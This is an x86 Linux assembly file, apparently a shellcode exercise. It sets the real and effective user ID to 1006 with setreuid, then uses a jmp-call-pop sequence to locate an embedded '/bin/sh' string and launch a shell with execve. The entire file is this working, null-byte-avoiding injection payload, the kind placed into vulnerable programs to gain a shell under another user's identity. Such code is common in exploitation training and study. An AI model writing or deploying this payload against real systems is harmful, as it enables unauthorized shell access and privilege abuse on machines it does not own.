section .text

global _start

_start:

; set the UID 
;setreuid (uid_t ruid, uid_t euid)
xor eax, eax ;clear eax register
xor ebx, ebx ;clear ebx register
xor ecx, ecx ;clear ecx register
xor edx, edx ;clear edx register
mov al, 70 ;set syscall number to 70 (setreuid)
mov bx, 1006 ;set uid to 1006
mov cx, 1006 ;set euid to 1006
int 0x80 ;execute syscall

;clears out registers for execve
xor eax, eax 
xor ebx, ebx 
xor ecx, ecx 
xor edx, edx 

;execve (const char *filename, char *const argv [], char *const envp[])
mov al, 11 ;set the syscall to be execve
jmp str_loc ;jump to the string location to load args

str_loc_ret:
    pop ebx         ;put the return addr into ebx
    mov [ebx+7],cl  ;null-terminate the string
    int 0x80        ;execute syscall

str_loc:
    call str_loc_ret
    db '/bin/sh'    ; put the string right here (will be grabbed from return addr location)
